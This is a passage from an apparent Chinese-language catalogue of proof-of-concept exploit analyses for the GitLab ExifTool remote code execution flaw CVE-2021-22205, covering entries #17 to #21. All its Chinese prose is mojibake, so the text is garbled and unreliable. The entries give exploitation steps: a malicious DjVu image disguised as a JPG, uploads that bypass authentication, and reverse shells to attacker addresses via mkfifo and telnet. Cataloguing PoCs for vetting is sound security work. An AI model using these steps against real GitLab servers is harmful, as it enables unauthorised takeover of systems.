1.  æ”»å‡»è€…é¦–å…ˆå‘é€ä¸€ä¸ª GET è¯·æ±‚åˆ° `/users/sign_in` èŽ·å– CSRF tokenã€‚è¯¥tokenç”¨äºŽåŽç»­çš„postè¯·æ±‚çš„è®¤è¯ã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥å›¾åƒæ–‡ä»¶åœ¨ metadata å­—æ®µä¸­åµŒå…¥æ¶æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…æž„é€ ä¸€ä¸ª multipart/form-data è¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä½œä¸ºæ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` è·¯å¾„ã€‚
4.  å½“ GitLab å¤„ç†ä¸Šä¼ çš„å›¾åƒæ—¶ï¼ŒExifTool ä¼šè¢«è°ƒç”¨æ¥æå–å›¾åƒå…ƒæ•°æ®ã€‚ç”±äºŽå›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ï¼ŒExifTool ä¼šæ‰§è¡Œè¿™äº›å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  åˆ©ç”¨ä»£ç ä¸­ï¼Œcommandå˜é‡å¯ä»¥å®šä¹‰åå¼¹shellæˆ–è€…æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [keven1z/CVE-2021-22205](https://github.com/keven1z/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #17

**æ¥æº**: [CVE-2021-22205-momika233_cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-.md](../2021/CVE-2021-22205-momika233_cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** å¯ä»Žç½‘ç»œè®¿é—®å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ï¼Œä¸”å®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ç‰ˆæœ¬ä¸­å­˜åœ¨çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚æ¼æ´žåŽŸå› æ˜¯ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒDjVuæ–‡ä»¶ï¼‰åˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸¤ä¸ªä¸»è¦æ­¥éª¤ï¼š
1.  **ç”ŸæˆPayloadï¼š**  PoC é¦–å…ˆç”Ÿæˆä¸€ä¸ªåä¸º lol.jpg çš„ DjVu å›¾åƒï¼Œè¯¥å›¾åƒåŒ…å«ä¸€ä¸ªåå‘ shell çš„ Payloadã€‚è¯¥Payloadä½¿ç”¨ `base64` ç¼–ç å¹¶æ‹¼æŽ¥shellå‘½ä»¤åˆ°æ–‡ä»¶æœ«å°¾. Payloadå»ºç«‹ä¸Ž `10.0.0.3` ç«¯å£ `1270` çš„åå‘è¿žæŽ¥ï¼Œå¹¶åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ã€‚
2.  **å‘é€Payloadï¼š**  PoC ä½¿ç”¨ `curl` å‘½ä»¤å°†ç”Ÿæˆçš„ lol.jpg æ–‡ä»¶ä¸Šä¼ åˆ° GitLab å®žä¾‹ã€‚`-F 'file=@lol.jpg'` å‚æ•°å°†æ–‡ä»¶ä½œä¸º POST è¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€ã€‚`http://10.0.0.7/$(openssl rand -hex 8)` è¡¨ç¤ºæ”»å‡»è€…å¯ä»¥é€šè¿‡ä»»æ„ endpoint è§¦å‘è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
é€šè¿‡åˆ†æžPoCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¿¹è±¡ã€‚è¯¥ä»£ç æ—¨åœ¨ç”Ÿæˆå¹¶ä¸Šä¼ ä¸€ä¸ªåŒ…å«åå‘ shell çš„å›¾åƒæ–‡ä»¶ã€‚æ‰€æœ‰æ“ä½œéƒ½æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´žï¼Œå¹¶æ²¡æœ‰æ·»åŠ ä»»ä½•ä¸Žæ¼æ´žåˆ©ç”¨æ— å…³çš„æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º 0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š
1.  æ”»å‡»è€…æž„é€ æ¶æ„çš„DjVuå›¾åƒï¼Œè¯¥å›¾åƒåµŒå…¥äº†å‘½ä»¤æ³¨å…¥Payloadã€‚
2.  æ”»å‡»è€…é€šè¿‡ä¸Šä¼ åŠŸèƒ½ï¼Œå°†æž„é€ çš„å›¾åƒä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ã€‚ç”±äºŽæœªè¿›è¡Œå……åˆ†çš„éªŒè¯ï¼Œä¸Šä¼ è¿‡ç¨‹ä¸ä¼šé˜»æ­¢æ¶æ„å›¾åƒã€‚
3.  GitLabåœ¨å¤„ç†å›¾åƒæ—¶ï¼Œè°ƒç”¨ExifToolç­‰å›¾åƒå¤„ç†å·¥å…·ã€‚
4.  ExifToolè§£æžæ¶æ„å›¾åƒï¼Œæ‰§è¡Œå…¶ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…é€šè¿‡åå‘shellèŽ·å–å¯¹GitLabæœåŠ¡å™¨çš„è®¿é—®æƒé™ï¼Œä»Žè€Œå®žçŽ°å¯¹ç³»ç»Ÿçš„æŽ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [momika233/cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-](https://github.com/momika233/cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #18

**æ¥æº**: [CVE-2021-22205-mr-r3bot_Gitlab-CVE-2021-22205.md](../2021/CVE-2021-22205-mr-r3bot_Gitlab-CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç›®æ ‡GitLabå®žä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

è¯¥æ¼æ´žå­˜åœ¨äºŽGitLabä¸­ï¼Œç”±äºŽExifToolåœ¨å¤„ç†å›¾åƒæ–‡ä»¶æ—¶æœªæ­£ç¡®éªŒè¯ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶è§¦å‘æ¼æ´žã€‚å…·ä½“æ¥è¯´ï¼ŒGitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒï¼Œè€ŒExifToolåœ¨å¤„ç†DjVuæ ¼å¼æ–‡ä»¶æ—¶ï¼Œå­˜åœ¨ä»£ç æ³¨å…¥æ¼æ´žã€‚æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„ä»£ç çš„DjVuæ–‡ä»¶ï¼Œå°†å…¶ä¸Šä¼ è‡³GitLabï¼Œå½“GitLabå°è¯•è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ä»£ç å°†è¢«æ‰§è¡Œï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨äº†CVE-2021-22205æ¼æ´žï¼Œç»éªŒè¯æœ‰æ•ˆã€‚å®ƒé€šè¿‡åˆ›å»ºåŒ…å«æ¶æ„å…ƒæ•°æ®çš„DjVuå›¾åƒæ–‡ä»¶ï¼Œç„¶åŽå°†å…¶ä¸Šä¼ åˆ°GitLabå®žä¾‹ã€‚å½“GitLabå¤„ç†è¯¥å›¾åƒæ—¶ï¼ŒExifToolä¼šæ‰§è¡ŒåµŒå…¥åœ¨å…ƒæ•°æ®ä¸­çš„å‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
åˆ†æžæä¾›çš„POCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°ä»»ä½•éšè—çš„æŠ•æ¯’ä»£ç ã€‚è¯¥ä»£ç çš„åŠŸèƒ½æ˜Žç¡®ï¼Œå³åˆ©ç”¨CVE-2021-22205æ¼æ´žæ‰§è¡Œå‘½ä»¤ã€‚æ‰€æœ‰æ“ä½œéƒ½åœ¨è„šæœ¬ä¸­æ¸…æ™°å¯è§ï¼Œæ²¡æœ‰æ··æ·†æˆ–éšè—è¡Œä¸ºã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦èŽ·å–ç›®æ ‡GitLabå®žä¾‹çš„URLã€‚
2.  ç„¶åŽï¼Œæ”»å‡»è€…ä½¿ç”¨POCè„šæœ¬ç”Ÿæˆä¸€ä¸ªåŒ…å«æ¶æ„DjVuå…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
3.  è„šæœ¬ä½¿ç”¨`djvumake`å‘½ä»¤åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„payloadçš„`rce.djvu`æ–‡ä»¶ï¼Œå†å°†å…¶é‡å‘½åä¸º`rce.jpg`ã€‚
4.  POCä»£ç é€šè¿‡æ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå°†ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°GitLabå®žä¾‹ã€‚
5.  GitLabæŽ¥æ”¶åˆ°æ–‡ä»¶åŽï¼Œä¼šè°ƒç”¨ExifToolè¿›è¡Œå¤„ç†ï¼Œç”±äºŽExifToolå­˜åœ¨æ¼æ´žï¼Œå¯¼è‡´æ‰§è¡Œå›¾åƒæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„ä»£ç ã€‚
6.  æ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤å°†åœ¨GitLabæœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [mr-r3bot/Gitlab-CVE-2021-22205](https://github.com/mr-r3bot/Gitlab-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #19

**æ¥æº**: [CVE-2021-22205-osungjinwoo_CVE-2021-22205-gitlab.md](../2021/CVE-2021-22205-osungjinwoo_CVE-2021-22205-gitlab.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8, >=13.9, <13.9.6, >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œéœ€è¦ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLabä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽGitLabæ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ExifToolå‘½ä»¤æ³¨å…¥ä»£ç ï¼Œå½“GitLabå°è¯•å¤„ç†è¯¥å›¾åƒæ—¶ï¼ŒExifToolä¼šæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„POCä»£ç ï¼Œæ­¤æ¼æ´žåˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯ä¸­CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡çº§åˆ«ï¼Œå¹¶ä¸”CISA KEVç›®å½•ä¹Ÿæ”¶å½•äº†è¯¥æ¼æ´žï¼Œè¯´æ˜Žå­˜åœ¨è¢«åˆ©ç”¨çš„æƒ…å†µã€‚POCä»£ç å®žçŽ°äº†æœªæŽˆæƒæƒ…å†µä¸‹çš„RCEï¼Œåˆ©ç”¨äº†ä¸Šä¼ åŠŸèƒ½å’ŒExifToolçš„å‘½ä»¤æ³¨å…¥ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯å®žçŽ°æ¼æ´žåˆ©ç”¨ï¼Œå¹¶æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚é£Žé™©è¯„ä¼°ä¸º5%ï¼Œè¾ƒä½Žã€‚

*   ä»£ç ç»“æž„æ¸…æ™°ï¼Œä¸»è¦åŠŸèƒ½ä¸ºæž„é€ æ¶æ„å›¾åƒä¸Šä¼ å¹¶æ‰§è¡Œå‘½ä»¤ã€‚
*   ä»£ç ä¸­å­˜åœ¨ä¸ŽDNSlogäº¤äº’çš„éƒ¨åˆ†ï¼Œå¯ä»¥éªŒè¯å‘½ä»¤æ‰§è¡Œï¼Œä½†ä¹Ÿå¯èƒ½è¢«æ»¥ç”¨ã€‚
*   æ€»ä½“è€Œè¨€ï¼Œä»£ç åŠŸèƒ½é›†ä¸­äºŽæ¼æ´žåˆ©ç”¨æœ¬èº«ï¼Œæ²¡æœ‰å‘çŽ°é¢å¤–æ¶æ„è¡Œä¸ºã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…é¦–å…ˆæ‰¾åˆ°ç›®æ ‡GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ (`/users/sign_in`)ã€‚
2.  ä»Žç™»å½•é¡µé¢çš„HTMLæºä»£ç ä¸­æå–CSRF tokenï¼Œç”¨äºŽåŽç»­çš„POSTè¯·æ±‚ã€‚
3.  æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ExifToolå‘½ä»¤çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ï¼ˆå®žé™…ä¸Šæ˜¯DJVUæ–‡ä»¶ï¼‰ã€‚è¯¥æ¶æ„å‘½ä»¤è¢«åµŒå…¥åˆ°å›¾åƒçš„metadataä¸­ã€‚
4.  é€šè¿‡å‘ `/uploads/user` ç«¯ç‚¹å‘é€åŒ…å«æ¶æ„å›¾åƒæ–‡ä»¶çš„multipart/form-data POSTè¯·æ±‚ï¼Œä¸Šä¼ è¯¥å›¾åƒã€‚
5.  GitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼ŒExifToolæ‰§è¡Œå›¾åƒmetadataä¸­çš„æ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

åˆ©ç”¨ä»£ç ä¸­åŒ…å«ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

*   æ£€æŸ¥æ¨¡å¼ (`-v true`)ï¼šé€šè¿‡ä¸Šä¼ åŒ…å«ç‰¹å®šDNSlogåŸŸåçš„æ¶æ„å›¾ç‰‡ï¼Œæ£€æŸ¥ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´žã€‚
*   æ”»å‡»æ¨¡å¼ (`-a true`)ï¼šå…è®¸æ”»å‡»è€…æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ (`-c command`)ï¼Œç›´æŽ¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æ–‡ä»¶æ¨¡å¼ (`-s true`): ä¸Šä¼ æŒ‡å®šæ–‡ä»¶ `-f file`ã€‚

æ€»ç»“ï¼šæ”»å‡»è€…é€šè¿‡ä¸Šä¼ ç²¾å¿ƒæž„é€ çš„æ¶æ„å›¾åƒï¼Œåˆ©ç”¨ExifToolå‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œå®žçŽ°åœ¨ç›®æ ‡GitLabæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [osungjinwoo/CVE-2021-22205-gitlab](https://github.com/osungjinwoo/CVE-2021-22205-gitlab)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #20

**æ¥æº**: [CVE-2021-22205-overgrowncarrot1_DejaVu-CVE-2021-22205.md](../2021/CVE-2021-22205-overgrowncarrot1_DejaVu-CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ä»Žç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žï¼Œå½±å“ä»Ž 11.9 å¼€å§‹çš„å¤šä¸ªç‰ˆæœ¬ã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶è€Œå¯¼è‡´çš„ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´žï¼Œä»Žè€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æ¼æ´žåˆ©ç”¨åˆ†æžï¼š**

æä¾›çš„`DejaVu.sh`è„šæœ¬ç”¨äºŽåˆ©ç”¨ CVE-2021-22205ã€‚ä»¥ä¸‹æ˜¯è„šæœ¬çš„å·¥ä½œåŽŸç†ï¼š

1.  **å‚æ•°å¤„ç†ï¼š** è„šæœ¬æŽ¥å— LHOSTï¼ˆæ”»å‡»è€…ç›‘å¬åœ°å€ï¼‰ã€LPORTï¼ˆæ”»å‡»è€…ç›‘å¬ç«¯å£ï¼‰å’Œ WEBHOSTï¼ˆç›®æ ‡ GitLab å®žä¾‹çš„ URLï¼‰ä½œä¸ºå‚æ•°ã€‚
2.  **ç”Ÿæˆæ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬åˆ›å»ºä¸€ä¸ªåä¸º `lol.jpg` çš„æ¶æ„å›¾åƒæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶çš„å‰é¢éƒ¨åˆ†æ˜¯æœ‰æ•ˆçš„JPEGæ–‡ä»¶ï¼ŒåŽé¢é™„åŠ äº†ç²¾å¿ƒæž„é€ çš„ExifToolå‘½ä»¤æ³¨å…¥æœ‰æ•ˆè½½è·ã€‚
3.  **ExifTool å‘½ä»¤æ³¨å…¥ï¼š** æ¼æ´žçš„æ ¹æºåœ¨äºŽ GitLab ä½¿ç”¨ ExifTool å¤„ç†å›¾åƒå…ƒæ•°æ®æ—¶å­˜åœ¨ç¼ºé™·ã€‚é€šè¿‡åœ¨å›¾åƒå…ƒæ•°æ®ä¸­æ’å…¥æ¶æ„å‘½ä»¤ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
4.  **åå¼¹ Shellï¼š** è¯¥è„šæœ¬ä½¿ç”¨ `mkfifo` åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼Œç„¶åŽä½¿ç”¨ `telnet` è¿žæŽ¥åˆ°æ”»å‡»è€…çš„ LHOST å’Œ LPORTï¼Œå¹¶å°† shell çš„è¾“å…¥å’Œè¾“å‡ºé‡å®šå‘åˆ°è¯¥ç®¡é“ã€‚è¿™æœ‰æ•ˆåœ°åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šå»ºç«‹äº†ä¸€ä¸ªåå¼¹ shellã€‚
5.  **ä¸Šä¼ æ¶æ„å›¾åƒï¼š** è„šæœ¬ä½¿ç”¨ `curl` å‘½ä»¤å°† `lol.jpg` æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ GitLab å®žä¾‹ã€‚`-F 'file=@lol.jpg'` å‚æ•°æŒ‡ç¤º `curl` å°†è¯¥æ–‡ä»¶ä½œä¸ºæ–‡ä»¶ä¸Šä¼ çš„ä¸€éƒ¨åˆ†å‘é€ã€‚æœåŠ¡å™¨åœ¨å¤„ç†ä¸Šä¼ çš„æ–‡ä»¶æ—¶ï¼Œä¼šè°ƒç”¨ ExifTool æ¥æå–å…ƒæ•°æ®ï¼Œä»Žè€Œè§¦å‘å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† CVE-2021-22205 ä¸­æè¿°çš„æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚é€šè¿‡è®¾ç½®æ­£ç¡®çš„ LHOSTã€LPORT å’Œ WEBHOSTï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ˜“å—æ”»å‡»çš„ GitLab å®žä¾‹ä¸ŠèŽ·å¾— shell è®¿é—®æƒé™ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

åˆ†æžæä¾›çš„è„šæœ¬ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è„šæœ¬é€»è¾‘æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨ CVE-2021-22205 æ¼æ´žã€‚æ²¡æœ‰å‘çŽ°ä»»ä½•è¯•å›¾åœ¨å—å®³è€…ç³»ç»Ÿä¸Šå®‰è£…åŽé—¨ã€åˆ é™¤æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œçš„éšè—ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼æ€»ç»“ï¼š**

1.  æ”»å‡»è€…å‡†å¤‡åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é…ç½® `DejaVu.sh` è„šæœ¬ï¼Œæä¾›æ”»å‡»è€…çš„ç›‘å¬åœ°å€å’Œç«¯å£ä»¥åŠç›®æ ‡ GitLab å®žä¾‹çš„ URLã€‚
3.  æ”»å‡»è€…æ‰§è¡Œè„šæœ¬ï¼Œè¯¥è„šæœ¬å°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab å®žä¾‹ã€‚
4.  GitLab å¤„ç†ä¸Šä¼ çš„å›¾åƒï¼Œè°ƒç”¨ ExifTool æå–å…ƒæ•°æ®ã€‚
5.  ExifTool æ‰§è¡Œæ¶æ„å…ƒæ•°æ®ä¸­åŒ…å«çš„å‘½ä»¤ï¼Œä»Žè€Œåœ¨æœåŠ¡å™¨ä¸Šå»ºç«‹åå¼¹ shellã€‚
6.  æ”»å‡»è€…çŽ°åœ¨å¯ä»¥é€šè¿‡åå¼¹ shell ä¸Ž GitLab æœåŠ¡å™¨äº¤äº’ã€‚

**é¡¹ç›®åœ°å€:** [overgrowncarrot1/DejaVu-CVE-2021-22205](https://github.com/overgrowncarrot1/DejaVu-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #21

**æ¥æº**: [CVE-2021-22205-pizza-power_Golang-CVE-2021-22205-POC.md](../2021/CVE-2021-22205-pizza-power_Golang-CVE-2021-22205-POC.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæŽˆæƒç”¨æˆ·æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žï¼Œæ”»å‡»è€…æ— éœ€è®¤è¯å³å¯è§¦å‘

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

